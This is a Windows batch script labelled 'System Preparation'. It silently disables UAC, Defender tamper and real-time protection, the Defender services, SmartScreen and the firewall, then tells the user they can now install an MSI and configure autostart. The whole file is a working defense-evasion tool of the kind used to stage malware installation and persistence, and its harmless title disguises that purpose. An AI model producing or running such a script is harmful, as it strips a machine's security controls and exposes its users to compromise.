@echo off
title System Preparation - Disable UAC & Defender
echo =========================================
echo   System Preparation - Disable UAC & Defender
echo =========================================
echo.
echo Please wait...

:: 1. Disable UAC
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
echo [OK] UAC disabled

:: 2. Disable Tamper Protection
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1
echo [OK] Tamper Protection disabled

:: 3. Disable real-time protection via registry
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
echo [OK] Real-time protection disabled

:: 4. Disable Defender via policy (persistent)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
echo [OK] Defender policy applied

:: 5. Stop and disable Defender services
sc stop WinDefend >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1
echo [OK] WinDefend service stopped and disabled

sc stop WdNisSvc >nul 2>&1
sc config WdNisSvc start= disabled >nul 2>&1
echo [OK] WdNisSvc service stopped and disabled

:: 6. Disable SmartScreen (optional, but helpful)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
echo [OK] SmartScreen disabled

:: 7. Disable Windows Firewall (optional, can be skipped)
netsh advfirewall set allprofiles state off >nul 2>&1
echo [OK] Windows Firewall disabled

echo.
echo System preparation completed.
echo All protections (UAC, Defender, SmartScreen, Firewall) have been disabled.
echo You can now install MSI and configure autostart.
pause